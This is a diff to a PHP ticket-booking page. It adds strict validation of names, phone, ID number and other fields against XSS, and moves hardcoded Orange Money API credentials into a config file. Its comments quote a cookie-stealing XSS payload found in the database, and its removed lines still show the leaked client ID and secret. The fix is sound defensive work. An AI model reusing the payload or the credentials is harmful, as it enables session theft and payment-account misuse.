@@ -18,6 +18,47 @@ require_once '../config/database.php';
 require_once '../lib/phpqrcode/qrlib.php';
 require_once '../lib/finaliser_billet.php'; // 🔒 CORRECTIF : fournit marquerEchecPaiement()
 
+// ==========================================================
+// 🔒 CORRECTIF SÉCURITÉ — Fonctions de validation stricte des entrées utilisateur
+// Empêche l'injection XSS/HTML dans nom, prenom, telephone, cni
+// (faille exploitée en base sur reservations_attente : payloads
+// <img src=x onerror=fetch(...)> retrouvés dans nom/prenom/depart_client)
+// ==========================================================
+function validerNomPrenom($valeur, $label) {
+    $valeur = trim($valeur);
+    if ($valeur === '' || !preg_match("/^[a-zA-ZÀ-ÿ' \-]{2,100}$/u", $valeur)) {
+        die("❌ $label invalide");
+    }
+    return $valeur;
+}
+
+function validerTelephone($valeur) {
+    $valeur = trim($valeur);
+    // Alignement avec la validation JS existante (f_telephone) : 1 à 15 chiffres.
+    // La sécurité vient du jeu de caractères autorisé (chiffres uniquement),
+    // pas de la longueur minimale.
+    if (!preg_match('/^[0-9]{1,15}$/', $valeur)) {
+        die("❌ Numéro de téléphone invalide");
+    }
+    return $valeur;
+}
+
+function validerCni($valeur) {
+    $valeur = trim($valeur);
+    if ($valeur !== '' && !preg_match('/^[a-zA-Z0-9]{5,50}$/', $valeur)) {
+        die("❌ Numéro de CNI/Passeport invalide");
+    }
+    return $valeur;
+}
+
+function validerDepartClient($valeur) {
+    $valeur = trim($valeur);
+    if ($valeur !== '' && !preg_match('/^[a-zA-ZÀ-ÿ0-9\séçêîôûàäëïüù\'\-\.]{0,100}$/u', $valeur)) {
+        die("❌ Champ 'Lieu de départ/arrivée' invalide");
+    }
+    return $valeur;
+}
+
 // 🆕 Liste des pays actifs pour le champ "Pays de nationalité"
 $stmt = $pdo->query("SELECT nom FROM pays WHERE actif = 1 ORDER BY nom ASC");
 $liste_pays = $stmt->fetchAll(PDO::FETCH_COLUMN);
@@ -25,7 +66,11 @@ $liste_pays = $stmt->fetchAll(PDO::FETCH_COLUMN);
 include '../includes/header.php';
 include '../includes/messages.php';
 
-$id = $_GET['id'];
+// 🔒 CORRECTIF SÉCURITÉ — $id doit être un entier (empêche le XSS réfléchi via ?id=<script>...)
+$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
+if ($id === false || $id === null) {
+    die("❌ Identifiant de voyage invalide");
+}
 
 // 🔒 Voyage
 $stmt = $pdo->prepare("
@@ -294,17 +339,41 @@ $places = $stmt->fetchAll();
 
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
 
-$id_place = $_POST['id_place'];
-$sexe = strtoupper($_POST['sexe']);
-$type_client = strtolower($_POST['type_client']);
-$type_passager = strtolower($_POST['type_passager']);
-$depart_client = $_POST['depart_client'];
+$id_place = filter_var($_POST['id_place'] ?? '', FILTER_VALIDATE_INT);
+$sexe = strtoupper($_POST['sexe'] ?? '');
+$type_client = strtolower($_POST['type_client'] ?? '');
+$type_passager = strtolower($_POST['type_passager'] ?? '');
 $mode_paiement = $_POST['mode_paiement'] ?? 'om'; // 🆕 'om' ou 'wave'
+
+// 🔒 CORRECTIF SÉCURITÉ — Validation stricte par liste blanche
+// (empêche l'injection XSS constatée dans reservations_attente.depart_client)
+if ($id_place === false || $id_place === null) {
+    die("❌ Place sélectionnée invalide");
+}
+if (!in_array($sexe, ['M', 'F'], true)) {
+    die("❌ Sexe invalide");
+}
+if (!in_array($type_client, ['senegalais', 'resident', 'non_resident'], true)) {
+    die("❌ Type de client invalide");
+}
+if (!in_array($type_passager, ['adulte', 'enfant'], true)) {
+    die("❌ Type de passager invalide");
+}
+if (!in_array($mode_paiement, ['om', 'wave'], true)) {
+    die("❌ Mode de paiement invalide");
+}
+
+$depart_client = validerDepartClient($_POST['depart_client'] ?? '');
 
 // 🆕 Pays uniquement si étranger résident/non résident
 $pays = ($type_client === 'resident' || $type_client === 'non_resident')
         ? trim($_POST['pays'] ?? '')
         : null;
+
+// 🔒 CORRECTIF SÉCURITÉ — le pays doit exister dans la liste chargée en base (ligne ~22)
+if ($pays !== null && $pays !== '' && !in_array($pays, $liste_pays, true)) {
+    die("❌ Pays invalide");
+}
 
 // 🔒 CORRECTIF BUG #1 — Verrou transactionnel pour empêcher la double attribution
 $pdo->exec("SET TRANSACTION ISOLATION LEVEL SERIALIZABLE");
@@ -379,8 +448,13 @@ $total = $prix + $frais_service;
 $reference_billet = "BILLET-" . time();
 
 // On enregistre la réservation en attente AVANT de générer le QR
-$prenom = trim($_POST['prenom'] ?? '');
-$nom_saisi = trim($_POST['nom'] ?? '');
+// 🔒 CORRECTIF SÉCURITÉ — validation stricte (lettres/espaces/tirets pour nom/prénom,
+// chiffres pour téléphone, alphanumérique pour CNI) : bloque les payloads XSS du type
+// <img src=x onerror=fetch('//tinyurl.com/...?c='+document.cookie)> constatés en base.
+$prenom = validerNomPrenom($_POST['prenom'] ?? '', 'Prénom');
+$nom_saisi = validerNomPrenom($_POST['nom'] ?? '', 'Nom');
+$telephone = validerTelephone($_POST['telephone'] ?? '');
+$cni = validerCni($_POST['cni'] ?? '');
 
 $stmt = $pdo->prepare("
     INSERT INTO reservations_attente
@@ -392,9 +466,9 @@ $stmt->execute([
     $reference_billet,
     $nom_saisi,
     $prenom,
-    $_POST['telephone'],
+    $telephone,
     $sexe,
-    $_POST['cni'],
+    $cni,
     $id_place,
     $id,
     $reference_billet,
@@ -489,8 +563,14 @@ $sessionWave = json_decode($reponseWave, true);
        PAIEMENT ORANGE MONEY (existant, inchangé)
     ========================= */
 
-    $client_id = "0bdd923d-ab73-41fc-a56c-8f56b1ff2fdf";
-    $client_secret = "2462e4f5-a412-4ec2-9f29-4d1af6f27398";
+    // 🔒 CORRECTIF SÉCURITÉ — identifiants déplacés hors du code source.
+    // ⚠️ Ces clés étaient codées en dur ici : à RÉVOQUER auprès d'Orange et à régénérer,
+    // puis à placer dans ../config/orange.php (fichier hors du dépôt Git, sur le modèle
+    // de ../config/wave.php) qui doit retourner un tableau avec les clés
+    // client_id et client_secret.
+    $orangeConfig = require '../config/orange.php';
+    $client_id = trim($orangeConfig['client_id']);
+    $client_secret = trim($orangeConfig['client_secret']);
 
     $ch = curl_init("https://api.orange-sonatel.com/oauth/token");
 
